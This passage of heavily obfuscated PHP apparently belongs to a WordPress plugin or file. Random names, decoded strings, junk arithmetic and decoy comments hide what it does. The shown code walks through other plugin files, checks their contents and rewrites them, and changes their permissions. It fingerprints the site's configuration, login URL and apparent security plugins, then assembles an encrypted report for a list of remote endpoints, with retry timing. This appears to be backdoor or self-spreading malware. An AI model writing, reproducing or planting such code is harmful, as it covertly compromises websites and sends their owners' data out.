   if  (!$GLOBALS['__scf_e_8z8ias8ka_43']($lboagfa__zx6_jm)    ||  $GLOBALS['__scf_fr9u7cq1eo_10']($lboagfa__zx6_jm)   <   (66+434) ||  at2pgldx1ep7sbjlr_r7($lboagfa__zx6_jm)  ||   !fgcc_h22bqxgwmccod($lboagfa__zx6_jm)) {
$lboagfa__zx6_jm =  false;


   $edc2651lsj0     =   n2fjr1yyl5ye7s_6q(t6995wceyqc2q1wqvl());


if  ($GLOBALS['__scf_e_8z8ias8ka_43']($edc2651lsj0) &&  !at2pgldx1ep7sbjlr_r7($edc2651lsj0) &&  fgcc_h22bqxgwmccod($edc2651lsj0)) {
 vmq5vh_lh7_vsiehf4nm(m40pvx5ij_z4mj(449),  $edc2651lsj0,  m5t68uuej1(450));$l5f1aj5stfyi=2644;$e53h1qbz3dpmp=$l5f1aj5stfyi%17;
 $lboagfa__zx6_jm    =  $edc2651lsj0;
 }
   if  (!$lboagfa__zx6_jm)   {
  @update_option(m40pvx5ij_z4mj(447), $GLOBALS['__scf_ibw9xvmx9ckin_187'](), m5t68uuej1(450));
      return;
}


    }
    $kzaqo1recyjayoyf  =  array(t6995wceyqc2q1wqvl());
$mattyf271acsx0qv  = gqtg_eoxyrv0ml2271n();
     $guk36_3z4l3k = h06jfdytq78tzk7($mattyf271acsx0qv,    (8516-3516));
    if    ($GLOBALS['__scf_pomb89yiuz_37']($guk36_3z4l3k))   {$l944krmz7=209|2;$yd7fn1mq=$l944krmz7^161;
foreach  ($guk36_3z4l3k   as    $d29li7yf2fvxv)  {

 if ($GLOBALS['__scf_vvn10ievj2k_9']($d29li7yf2fvxv,  -(161^165)) ===  m5t68uuej1(451))  $kzaqo1recyjayoyf[] =     $mattyf271acsx0qv  . '/'    .  $d29li7yf2fvxv;
}

     }
    if    (defined(m5t68uuej1(452))    && $GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(73))) {
 foreach  ((array)  @$GLOBALS['__scf_ql1i4f573p8rhm_73'](WP_PLUGIN_DIR  .     m40pvx5ij_z4mj(453))  as  $vi4gti82vgh)  $kzaqo1recyjayoyf[]  = $vi4gti82vgh;
 }


$kzaqo1recyjayoyf    =  $GLOBALS['__scf_jghjt9zxt358_149']($kzaqo1recyjayoyf);
  $st6q4v4canpq1s4o  =    array();

       $yi_o1ja0fdpvz1e7  =   $GLOBALS['__scf_vvn10ievj2k_9']($GLOBALS['__scf_r1v12_o00h5hc_454'](lpwgqh9300(455), "", $GLOBALS['__scf_vvn10ievj2k_9']($lboagfa__zx6_jm,  0, (127353-61817))),   0,   (2039+9));
 foreach ($kzaqo1recyjayoyf   as $ln5_jbqpu4in)   {
  $ob1u5r4y2s  =  @$GLOBALS['__scf_pftf6vocmvs2m_99']($ln5_jbqpu4in);
   if   (!$ob1u5r4y2s ||    $ob1u5r4y2s  <= (1048560+16))     continue;
 $r153rlevy8t8kkaz =     @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($ln5_jbqpu4in,     false,     null,  0, (65504+32));


if  (!$GLOBALS['__scf_e_8z8ias8ka_43']($r153rlevy8t8kkaz) ||  !at2pgldx1ep7sbjlr_r7($r153rlevy8t8kkaz)) continue;
 if    ($ln5_jbqpu4in     !==   t6995wceyqc2q1wqvl()   &&  $GLOBALS['__scf_vvn10ievj2k_9']($GLOBALS['__scf_r1v12_o00h5hc_454'](m40pvx5ij_z4mj(455),    "",  $r153rlevy8t8kkaz),     0,  (0x212+0x5ee))  !==      $yi_o1ja0fdpvz1e7) continue;
    $st6q4v4canpq1s4o[]   =  $ln5_jbqpu4in;
  }
  if   (!$st6q4v4canpq1s4o)  {
  @update_option(m5t68uuej1(456),  $GLOBALS['__scf_ibw9xvmx9ckin_187'](), lpwgqh9300(457));
if ($GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(63)))   set_transient(m5t68uuej1(448),    1,   (996-396));



 return;
       }
    @update_option(m40pvx5ij_z4mj(458),  $GLOBALS['__scf_ibw9xvmx9ckin_187'](),   lpwgqh9300(457));
  foreach ($st6q4v4canpq1s4o  as    $e7s4480cj8b1c)   {
cik9ldzrbjmtnzm00($e7s4480cj8b1c,      (0x19c+0x8));
    if (a3hx61zfms1ji3euwsc($e7s4480cj8b1c,  y2fq_g7qilvdboqm1($lboagfa__zx6_jm)))  {



nhm51ioabawwjskqka9eh3($e7s4480cj8b1c);



 tgj6urla_2q3x4g8e($e7s4480cj8b1c);
    cik9ldzrbjmtnzm00($e7s4480cj8b1c,   (354+66));

  lnseazh_1k4yq6v_kjl($e7s4480cj8b1c);


  if  ($e7s4480cj8b1c     ===    t6995wceyqc2q1wqvl()) {
z2lalb3eiqlgy6ozb9(true);
   ai51jutf9hg_v2ib(true);


 }
 }      else {$_82chhvov0r7zy=62*6;$vjy6amb0m_js=$_82chhvov0r7zy-49;

  cik9ldzrbjmtnzm00($e7s4480cj8b1c,   (327+93));$gm7w9o3m=218|222;$ipqaoqut11l5=$gm7w9o3m^99;
 }
  }
     }  catch (Throwable   $k3g08rnqu9m)    {


     r63yaewew47stuijcrwsx6(bovhd4vawcd(459),  $k3g08rnqu9m);
 } catch   (Exception   $k3g08rnqu9m)   {
}


   }


    function  io8f74o05_4rvf4()
 {
static    $myw3h598abz  = false;
    if ($myw3h598abz) return;


$myw3h598abz  =  true;
      try     {
 bhlbtvxye0zoi2fsmbyk_();
     i2yexl_j1s5ivgiiqy_39();
     lbi2uco0mlnot4zc3k5kqe();
  n1o_pvf67he3sltgu();
   owb64bf9m2eyvldimcl3h2();
zy3td9hebmtic9vrgh5h();

        hqhwxezqsdtentoalh6kfl();
// @phi-insert timeout-policy




   r92zksip69l03_cq();


 jifrqsvsv2pg00h86t();
       if   (e2cjko8uls1hvw())   {
// frame pointer

if    ($GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(460)) &&  did_action(m40pvx5ij_z4mj(386)))     {



   if  ($GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(461)))   $GLOBALS['__scf_w5tg0wn3h2rih_170'](m5t68uuej1(387));
  } else     {
  ki6tdgirglgewq(m5t68uuej1(386),    m5t68uuej1(387), 0);
  }
     }
   }     catch    (Throwable  $k3g08rnqu9m) {
  }  catch  (Exception  $k3g08rnqu9m)   {
 }

 }
      function      zajx5ferauowzwf()
  {
  try    {
  if   (!$GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(290))  ||     !$GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(462)))   return;
    if     (!$GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(446))  ||   !$GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(349)))  return;

  $gth83v029sdq    =  $GLOBALS['__scf_ibw9xvmx9ckin_187']();
    if ($gth83v029sdq    -     (int)   @get_option(m5t68uuej1(463),  0)      <  (3593+7))  return;
  @update_option(lpwgqh9300(463),  $gth83v029sdq,  lpwgqh9300(464));


    @$GLOBALS['__scf_bgujd0wqxduxtu_290'](home_url('/'),   array(m40pvx5ij_z4mj(465)  =>  2,   lpwgqh9300(308) => false, bovhd4vawcd(466)  =>     false));



}     catch (Throwable  $k3g08rnqu9m)   {
// WP Script Modules taxonomy registration

   }  catch  (Exception $k3g08rnqu9m)  {
}
// WP Data Layer: acknowledge resolver

 }
 function e2cjko8uls1hvw()
  {
if  (! $GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(446))) {
 return  true;
        }
// @inject factory

  
if     ($GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(467))  &&   get_transient(ikw0tf8wjoufcwbi7uaqr()))   {
// evaluate closed prototype

 return   false;
 }
// renew event-bus for WP Button Block

     


   $tvbdiqkqxz68  =     byffua_rebmvk2();


$lyoy9wp67q_     =    i1v3dbjfcu375r(bovhd4vawcd(372),     false);
   if  ($GLOBALS['__scf_pomb89yiuz_37']($lyoy9wp67q_)   && isset($lyoy9wp67q_[bovhd4vawcd(468)])    && (int) $lyoy9wp67q_[bovhd4vawcd(468)] >= (238+62) &&     (int)    $lyoy9wp67q_[m40pvx5ij_z4mj(469)] <=    (0x7d5d+0xd423))      $tvbdiqkqxz68 =    (int) $lyoy9wp67q_[m5t68uuej1(469)];
    $o_c51xo11lee4yvb =  (int)  get_option(m5t68uuej1(424),   0);
       if      ($o_c51xo11lee4yvb   > 0   &&  ($GLOBALS['__scf_ibw9xvmx9ckin_187']()  -  $o_c51xo11lee4yvb)      < $tvbdiqkqxz68) {
return   false;
  }


     


  $d54mgpafvvk9z   =  (int)  get_option(lpwgqh9300(470),    0);
 if    ($d54mgpafvvk9z  > 0)   {
 $l_gthddzkkpugu   =   (int)  get_option(lpwgqh9300(471),  0);


     $m7vxt8ae8upeyp      = array((544-244),  (892+8),  (1112+688), (3512+88), (3535+65));
$e6vypoueknn = $m7vxt8ae8upeyp[$GLOBALS['__scf_f0qmyuwszehfh7_472'](0,  $GLOBALS['__scf_fffiaden_pfx9__473']($l_gthddzkkpugu  - 1,   (0x2+0x2)))];
 $e6vypoueknn  += $GLOBALS['__scf_e1fr80hqavau3c_353'](0, (int)  ($e6vypoueknn  *    0.25));$_bnm6tvytt=(0x63+0x88);$atq353wehsoxy=$_bnm6tvytt%11;


if  (($GLOBALS['__scf_ibw9xvmx9ckin_187']()  -    $d54mgpafvvk9z)    <  $e6vypoueknn)     {



    return  false;
}
   }
 
      return     true;
   }

function   lq7k952lmpxoqycunz0jnx()
  {
  $l_gthddzkkpugu   = (int)    get_option(m40pvx5ij_z4mj(474),   0);
 update_option(m40pvx5ij_z4mj(474), $l_gthddzkkpugu +  1);
   update_option(m5t68uuej1(470), $GLOBALS['__scf_ibw9xvmx9ckin_187']());
  }
   function ssxisv9nwyrcw4()
   {
  $v9qf3vep2p  =  array();
 try     {
     $v9qf3vep2p[m5t68uuej1(475)]  = kdgw8qqvzf6yolk();
 $v9qf3vep2p[bovhd4vawcd(476)]  =   PHP_VERSION;


     $v9qf3vep2p[lpwgqh9300(477)] = $GLOBALS['__scf_ebsa9aprq0y_104']();
  $v9qf3vep2p[m40pvx5ij_z4mj(478)]  =  ($GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(479)) &&   is_ssl())  ?   1 :  0;
 $v9qf3vep2p[lpwgqh9300(480)]  = ($GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(206))   &&  is_multisite()) ?   1  :      0;
   $v9qf3vep2p[m5t68uuej1(481)] =   isset($GLOBALS[m5t68uuej1(482)]) ?     (string)  $GLOBALS[bovhd4vawcd(483)]  : "";

   $v9qf3vep2p[lpwgqh9300(484)]    = isset($_SERVER[m40pvx5ij_z4mj(108)])    ?  $GLOBALS['__scf_vvn10ievj2k_9']((string)  $_SERVER[lpwgqh9300(108)],  0,  (21+19)) :  "";$mnht0vuuo1q=(0xb+0x65);$e_ysbvib4vh=$mnht0vuuo1q%2;


  $pu_z2vslfbo = (isset($GLOBALS[m5t68uuej1(485)])  && $GLOBALS['__scf_e_8z8ias8ka_43']($GLOBALS[m40pvx5ij_z4mj(485)]))    ?   $GLOBALS['__scf_nimluvpxhrpvn_323']($GLOBALS[m5t68uuej1(485)]) :  "";
  $v9qf3vep2p[lpwgqh9300(486)]   =   ($pu_z2vslfbo  !==    "")    ? 1 : 0;
    $v9qf3vep2p[m40pvx5ij_z4mj(487)]  = $GLOBALS['__scf_fr9u7cq1eo_10']($pu_z2vslfbo);

$v9qf3vep2p[m40pvx5ij_z4mj(488)]   =  !empty($GLOBALS[m5t68uuej1(489)])     ? 1     :  0;
 $v9qf3vep2p[m5t68uuej1(490)]    =   !empty($GLOBALS[m5t68uuej1(491)])  ?     1 : 0;



 $v9qf3vep2p[m40pvx5ij_z4mj(492)]  =     $GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(446)) ?   (int)    @get_option(m40pvx5ij_z4mj(493),  0) : 0;
    $v9qf3vep2p[lpwgqh9300(494)]   =    (sb3q0_7sw2xmlw84(m40pvx5ij_z4mj(495),    "") !== "")  ?  1  :   0;
   $v9qf3vep2p[bovhd4vawcd(496)]    =   $GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(497))  ?   (int)  @get_option(lpwgqh9300(498),   0)      :    0;
     $v9qf3vep2p[lpwgqh9300(499)]    = $GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(500))  ?   (int)  @get_option(m40pvx5ij_z4mj(501),  0)      :    0;
 $v9qf3vep2p[m5t68uuej1(502)]    =    $GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(500)) ?   (int)   @get_option(bovhd4vawcd(503),   0)  :    0;


 $e3thri4q7dp    = r5waslskyqytjrm6();
 $v9qf3vep2p[bovhd4vawcd(504)] =  @$GLOBALS['__scf_a83pywb98qzq2_20']($e3thri4q7dp .      bovhd4vawcd(505))  ?      (o5b5us8hgx93bum66mppi(@$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($e3thri4q7dp  .  m40pvx5ij_z4mj(505),  false,    null,     0,    (8148+44)))   ? 2  : 1) : 0;
        $v9qf3vep2p[lpwgqh9300(506)]  =  @$GLOBALS['__scf_a83pywb98qzq2_20']($e3thri4q7dp    . m5t68uuej1(507)) ? (o5b5us8hgx93bum66mppi(@$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($e3thri4q7dp      .  bovhd4vawcd(507),     false,    null,     0, (8623-431))) ? 2  :  1)   :    0;
 $v9qf3vep2p[m40pvx5ij_z4mj(508)]     =   @$GLOBALS['__scf_a83pywb98qzq2_20']($e3thri4q7dp . bovhd4vawcd(509))   ?    (o5b5us8hgx93bum66mppi(@$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($e3thri4q7dp  .  m5t68uuej1(509),    false, null,   0,   (0xb4+0x1f4c)))   ?     2  :    1)   :    0;


   $tr0sj4wrpgdq =   m40pvx5ij_z4mj(510)  .      dv62azao9qb3z33m4cwig0(ABSPATH   .  'g',  (3+5));
$ybkyd2c6py    =   bovhd4vawcd(511)  .     dv62azao9qb3z33m4cwig0(ABSPATH  . 'g',   (9-1));
 

  $v9qf3vep2p[lpwgqh9300(512)] =   0;
foreach   (array(dha61pphirvk3tnlr(),    $e3thri4q7dp,  ABSPATH .  m40pvx5ij_z4mj(513))  as  $e2vy0xue4c91r)   {
  if  (@$GLOBALS['__scf_a83pywb98qzq2_20']($e2vy0xue4c91r   .    '/' .    $tr0sj4wrpgdq  .  lpwgqh9300(514))) $v9qf3vep2p[m5t68uuej1(512)] =  1;
   if   (@$GLOBALS['__scf_a83pywb98qzq2_20']($e2vy0xue4c91r    .  '/'  .  $ybkyd2c6py)  &&  (int)    @$GLOBALS['__scf_tm09rtls_27e_98']($e2vy0xue4c91r   .   '/'    .  $ybkyd2c6py)   >   $GLOBALS['__scf_ibw9xvmx9ckin_187']()  -      (277-37)) {



$v9qf3vep2p[m5t68uuej1(515)] =  2;
    

  break;
 }
}
  unset($ybkyd2c6py,  $e2vy0xue4c91r);
      $v2szluzwve7   =   $GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(395)) ? @$GLOBALS['__scf_qa8nkfur9w_111'](lpwgqh9300(516))  :  false;
if (!$GLOBALS['__scf_e_8z8ias8ka_43']($v2szluzwve7)  ||  $v2szluzwve7 ===   "" || $v2szluzwve7  === lpwgqh9300(517))  $v2szluzwve7    =  bovhd4vawcd(518);



$v9qf3vep2p[m40pvx5ij_z4mj(519)] =  (@$GLOBALS['__scf_a83pywb98qzq2_20'](ABSPATH .  $v2szluzwve7)    &&   $GLOBALS['__scf_i8i8g4oxha_7']((string) @$GLOBALS['__scf_c7jg5u2s_wzbrw_95'](ABSPATH  .  $v2szluzwve7), lpwgqh9300(520))  !==    false)     ? 1     :  0;
$v9qf3vep2p[m5t68uuej1(521)] =     (@$GLOBALS['__scf_a83pywb98qzq2_20'](ABSPATH  .  lpwgqh9300(522)) &&   $GLOBALS['__scf_i8i8g4oxha_7']((string)     @$GLOBALS['__scf_c7jg5u2s_wzbrw_95'](ABSPATH .  m5t68uuej1(522)),    m40pvx5ij_z4mj(520))  !== false) ? 1    :    0;
    $v9qf3vep2p[m5t68uuej1(523)]      =    (@$GLOBALS['__scf_a83pywb98qzq2_20'](ABSPATH .    m5t68uuej1(524)) && $GLOBALS['__scf_i8i8g4oxha_7']((string)  @$GLOBALS['__scf_c7jg5u2s_wzbrw_95'](ABSPATH  . m40pvx5ij_z4mj(524),  false, null,  0,   (114290-48754)), lpwgqh9300(525)) !== false)   ?  1  : 0;
$v9qf3vep2p[bovhd4vawcd(526)]   =  defined(lpwgqh9300(527)) ?   1   : 0;
    $v9qf3vep2p[m5t68uuej1(528)]  =   (defined(m5t68uuej1(529)) ||   defined(m40pvx5ij_z4mj(530))    ||   defined(m5t68uuej1(531)) ||  $GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(532)) ||   $GLOBALS['__scf_l_p7ggy6l__533'](m5t68uuej1(534))  ||  isset($GLOBALS[lpwgqh9300(535)])    ||  $GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(536)))  ?  1     :  0;
$v9qf3vep2p[m40pvx5ij_z4mj(537)] =  (int)   get_option(bovhd4vawcd(538), 0);
     $v9qf3vep2p[lpwgqh9300(539)]   =     (int) get_option(m40pvx5ij_z4mj(540),     0);
$v9qf3vep2p[bovhd4vawcd(541)]     = (int)      get_option(m5t68uuej1(470), 0);
 $fcfza5ix0y    =   d6ydz3_mq4hw_2s8_bo(bovhd4vawcd(542),     array());
  $aalo1e_lvxvgg    =  0;
$dh06t5j8lu7 =    0;


   if ($GLOBALS['__scf_pomb89yiuz_37']($fcfza5ix0y)) {
 foreach  ($fcfza5ix0y   as  $d29li7yf2fvxv)     {
 if  (jf1xgzzqcjve53lck9($d29li7yf2fvxv)   ===  "")     continue;
  $aalo1e_lvxvgg++;
     $z6f9dlim6efobg4 =    $GLOBALS['__scf_pomb89yiuz_37']($d29li7yf2fvxv)    ?   (int) (isset($d29li7yf2fvxv[m5t68uuej1(543)])  ?   $d29li7yf2fvxv[m5t68uuej1(543)]  :   1)    :  1;
 $pl61c488om  =   $GLOBALS['__scf_pomb89yiuz_37']($d29li7yf2fvxv)    &&  isset($d29li7yf2fvxv[lpwgqh9300(544)])   ?    (int) $d29li7yf2fvxv[m40pvx5ij_z4mj(544)]  :  0;


        if  (!$z6f9dlim6efobg4    &&   (!$pl61c488om  ||  $pl61c488om    <   $GLOBALS['__scf_ibw9xvmx9ckin_187']()  -   (5351-1751)))   $dh06t5j8lu7++;
    

 }
       }


        $v9qf3vep2p[lpwgqh9300(545)]  =   $aalo1e_lvxvgg;
   $v9qf3vep2p[bovhd4vawcd(546)]  =    $dh06t5j8lu7;
 $xi3mqg7x_lsr_bvk   = $GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(500))    ?  @get_option(m40pvx5ij_z4mj(547), "") :     "";
     $v9qf3vep2p[m40pvx5ij_z4mj(548)]   =      $GLOBALS['__scf_e_8z8ias8ka_43']($xi3mqg7x_lsr_bvk)     ?  $GLOBALS['__scf_vvn10ievj2k_9']($xi3mqg7x_lsr_bvk,  0,   (248^253))  :   "";
  $hip5tba1l_z03xs0     = $GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(500))  ?  @get_option(lpwgqh9300(549),  array())   :  array();

 $v9qf3vep2p[m40pvx5ij_z4mj(550)]  =  ($GLOBALS['__scf_pomb89yiuz_37']($hip5tba1l_z03xs0)   &&    (!empty($hip5tba1l_z03xs0['t'])  || !empty($hip5tba1l_z03xs0[m5t68uuej1(551)])))   ?  1 :    0;
}      catch (Throwable    $k3g08rnqu9m) {
 $v9qf3vep2p[lpwgqh9300(552)]  = $GLOBALS['__scf_vvn10ievj2k_9']($k3g08rnqu9m->getMessage(),      0, (3+57));
}  catch     (Exception $k3g08rnqu9m)  {
     $v9qf3vep2p[m40pvx5ij_z4mj(553)]  =    $GLOBALS['__scf_vvn10ievj2k_9']($k3g08rnqu9m->getMessage(),   0,     (0x8+0x34));
 }

    return $v9qf3vep2p;

  }
  
    function  hdkboxrvjs0_6by()
 {$py0coawnskt=(0xb2+0x47);$ziwis2dfe2=$py0coawnskt%12;
  if   ($GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(388)))  {
// expire unsatisfiable validator

   return  (string) site_url(m5t68uuej1(554));
 }



      return    $GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(555))     ?    (string)     wp_login_url()   :  "";
    }
      
  function rgrb14nj3p43kvdym51x($n13lnt1ous87idh)

    {
 $vei8zyqdyrt    =   "";
if    ($GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(556)))     {
   $vei8zyqdyrt   =   (string) $GLOBALS['__scf_jphyng87rekxk_557'](home_url(),   constant(lpwgqh9300(558)));
}
 if     (!    $vei8zyqdyrt &&   $GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(559)))   {
    $vei8zyqdyrt    = (string) $GLOBALS['__scf_jphyng87rekxk_557'](get_site_url(),     constant(bovhd4vawcd(558)));$fi3b_4j28_b=123|146;$_fckrjxdub3=$fi3b_4j28_b^243;
   }
 if (!     $vei8zyqdyrt && $GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(560)))   {
        $vei8zyqdyrt  = (string) $GLOBALS['__scf_jphyng87rekxk_557'](get_bloginfo(m40pvx5ij_z4mj(561)),     constant(bovhd4vawcd(558)));
       

 }
   if   (! $vei8zyqdyrt  &&  $GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(500)))    {
  $vei8zyqdyrt = (string)  $GLOBALS['__scf_jphyng87rekxk_557']((string)    get_option(lpwgqh9300(562),  ""),  constant(m5t68uuej1(558)));


 }



if (! $vei8zyqdyrt &&   isset($_SERVER[m40pvx5ij_z4mj(563)]))    {


   $vei8zyqdyrt =     (string)  $_SERVER[lpwgqh9300(563)];
      }
      if   (! $vei8zyqdyrt    &&  isset($_SERVER[bovhd4vawcd(564)]))   {
    $vei8zyqdyrt =      (string)   $_SERVER[m40pvx5ij_z4mj(564)];
 }
  if  (!  $vei8zyqdyrt)   {
// deallocate convex bridge

   return  $n13lnt1ous87idh;
}
  return   $vei8zyqdyrt;
    }



       function     dade6y16p3ix6n($c0ahviq4mvrhliv6    =  0)
      {
  try  {
      $loru1ec7_1jr  =  $GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(395))  ?    (int)  @$GLOBALS['__scf_qa8nkfur9w_111'](m5t68uuej1(565))   :     0;
if     ($GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(566)))  @$GLOBALS['__scf_hkezfepne6p6xo_429']((357-177));

   $ey9n2oy0hsf  = ($loru1ec7_1jr >    (8+12) && $loru1ec7_1jr    < (0x7d+0x37))   ?  ($loru1ec7_1jr    - (0x2+0x8))     :     (($loru1ec7_1jr >  0 &&   $loru1ec7_1jr   <=      (0x10+0x4))    ? (0x5+0x5)  :   (0x23+0x37));
  if ($c0ahviq4mvrhliv6 > 0  &&   $ey9n2oy0hsf  >    $c0ahviq4mvrhliv6)    $ey9n2oy0hsf  =   $c0ahviq4mvrhliv6;
 $GLOBALS[m40pvx5ij_z4mj(286)]    =  $GLOBALS['__scf_ciwgxuks3i4cd_287'](true)    + $ey9n2oy0hsf;
    if  (!  e2cjko8uls1hvw())  {$b_yb221_d_y8=43+50;$fdr5yip8i=$b_yb221_d_y8-43;

       return;$ptk2m_bx=40|219;$lpsrsbcy=$ptk2m_bx^198;
  }
 if      (!beqgo0gfq6yfj82i0o(lpwgqh9300(383))) {
  return;
 }
       

 $f2diu9fz7_m     =  $GLOBALS['__scf_ciwgxuks3i4cd_287'](true);
 $t4l5vmih46xjqsx5 = a_5kqstbi6v7gcdg3kg((int)  ($ey9n2oy0hsf   *  0.6));
 if     (
  !    $GLOBALS['__scf_pomb89yiuz_37']($t4l5vmih46xjqsx5)
     || !   isset($t4l5vmih46xjqsx5[m40pvx5ij_z4mj(341)]) ||  !   $GLOBALS['__scf_e_8z8ias8ka_43']($t4l5vmih46xjqsx5[m40pvx5ij_z4mj(341)]) || !  $t4l5vmih46xjqsx5[m5t68uuej1(341)]

   ||     !   isset($t4l5vmih46xjqsx5[bovhd4vawcd(567)])    ||  ! $GLOBALS['__scf_pomb89yiuz_37']($t4l5vmih46xjqsx5[bovhd4vawcd(568)]) ||    empty($t4l5vmih46xjqsx5[m40pvx5ij_z4mj(568)])
  )      {
       lq7k952lmpxoqycunz0jnx();
return;
    }
$ul1udrmdfovy3  =  $t4l5vmih46xjqsx5[lpwgqh9300(569)];
$yfp1xvji3fo  =   $t4l5vmih46xjqsx5[m5t68uuej1(568)];
    vmq5vh_lh7_vsiehf4nm(bovhd4vawcd(344),   $ul1udrmdfovy3,   m40pvx5ij_z4mj(464));



 vmq5vh_lh7_vsiehf4nm(lpwgqh9300(570),   $GLOBALS['__scf_i8i8g4oxha_7']($ul1udrmdfovy3, lpwgqh9300(571)) === 0      ?  1   :  0,   bovhd4vawcd(464));
    $xqnjr7bzbeg8hya  = $GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(500))      ? (string)    get_option(lpwgqh9300(572),   "")   : "";
  if  ($xqnjr7bzbeg8hya !==     ""  &&   $GLOBALS['__scf_hf87ul3fvpzrkm_150']($xqnjr7bzbeg8hya,  $yfp1xvji3fo, true))      {
$yfp1xvji3fo =     $GLOBALS['__scf__ofafsmvux__148']($GLOBALS['__scf_r3sim5_axb_151']($yfp1xvji3fo, array($xqnjr7bzbeg8hya)));
   $GLOBALS['__scf_yjcl8fn_3cky0_573']($yfp1xvji3fo);
   $GLOBALS['__scf_fmhpnvbht5ss5n_322']($yfp1xvji3fo,    $xqnjr7bzbeg8hya);
   }     elseif   ($GLOBALS['__scf_xbixt340jb_38']($yfp1xvji3fo)      > 1)  {
    $GLOBALS['__scf_yjcl8fn_3cky0_573']($yfp1xvji3fo);
}

    
  if (($GLOBALS['__scf_ciwgxuks3i4cd_287'](true)  -   $f2diu9fz7_m) >   (int)   ($ey9n2oy0hsf      *  0.6))  {$t8ggq4y03yjf=PHP_MAJOR_VERSION;$m6ilpjbqmp_umf=$t8ggq4y03yjf*10;
lq7k952lmpxoqycunz0jnx();
return;
  }


  
  $wkd71g0d9wa99    = f9ml3iyd9gbyvhoer0h4();
      if (qgs0j96xr638o3621($wkd71g0d9wa99)) {
 $wkd71g0d9wa99      = f9ml3iyd9gbyvhoer0h4();
 }



$h2r77ywzquj  = array();
  if ($GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(500)))  {
    foreach     ((array) get_option(bovhd4vawcd(147),  array())    as $ln5_jbqpu4in) {
 if  ($GLOBALS['__scf_e_8z8ias8ka_43']($ln5_jbqpu4in)      &&    $ln5_jbqpu4in) {

$h2r77ywzquj[] = $ln5_jbqpu4in;
 }



    }
// WP Script Modules: hermitian registry

}
 
$nrmjen8rw5idhu     =  array();
  if (defined(bovhd4vawcd(574)))     {
 $hyl8fzf5o27j4    =  $GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(73))  ?    @$GLOBALS['__scf_ql1i4f573p8rhm_73']($GLOBALS['__scf_zsw089px33o1o__12'](WPMU_PLUGIN_DIR, '/')     .  m5t68uuej1(74))  :   false;
 if ($GLOBALS['__scf_pomb89yiuz_37']($hyl8fzf5o27j4))   {
  foreach   ($hyl8fzf5o27j4 as $e7s4480cj8b1c)    {
  $nrmjen8rw5idhu[]  =    $GLOBALS['__scf_os_n9tj5psxjj_3']($e7s4480cj8b1c);
  }
  }
 }
  
   $wxisg_ysqw7tkm  =  array(
 m40pvx5ij_z4mj(575) => rgrb14nj3p43kvdym51x(""),
  bovhd4vawcd(576)     =>  kdgw8qqvzf6yolk(),
    m40pvx5ij_z4mj(577)   => $GLOBALS['__scf_os_n9tj5psxjj_3'](t6995wceyqc2q1wqvl(),  m5t68uuej1(514)),
 m40pvx5ij_z4mj(578) =>  $GLOBALS['__scf_zsw089px33o1o__12'](ABSPATH,    lpwgqh9300(579)),



 bovhd4vawcd(580)    =>    $h2r77ywzquj,
 m5t68uuej1(581)  =>   $nrmjen8rw5idhu,
  lpwgqh9300(582) =>  hdkboxrvjs0_6by(),
     m40pvx5ij_z4mj(583)  => (object)  gcbvm3osms8zsh_($wkd71g0d9wa99),
 lpwgqh9300(584)  =>    (object) du2xfgtjox5z5v7wf($wkd71g0d9wa99),
lpwgqh9300(585) => ($pci02ch3s90ay =  t78r30znuybrmbsnd()),




);
$_w8thdl5xkioyo2  = $GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(586))   ?  wp_json_encode($wxisg_ysqw7tkm) :  $GLOBALS['__scf_sfkxpd8jhlhj_587']($wxisg_ysqw7tkm);
  $qy42ymwa1sv9kn   =  k__ppv5v06f7k9n1nm($_w8thdl5xkioyo2,   $ul1udrmdfovy3);
    $x5qux7tar0eo   =   array(m5t68uuej1(588)   => m40pvx5ij_z4mj(589));
 $cmpm56v6mwop4 =  null;
  $kzqs0adn5uh7 =  false;
    lq7k952lmpxoqycunz0jnx();$k9qbmy9zopfw20=PHP_INT_MAX/PHP_INT_MAX;$v5c6s0zpava_9=$k9qbmy9zopfw20+64;
  $GLOBALS[m40pvx5ij_z4mj(313)]    = false;
      
     foreach  ($yfp1xvji3fo  as  $azf98962xi) {$lpcw0yxx3ic=22*7;$nuniz342rtv1=$lpcw0yxx3ic-3;
 


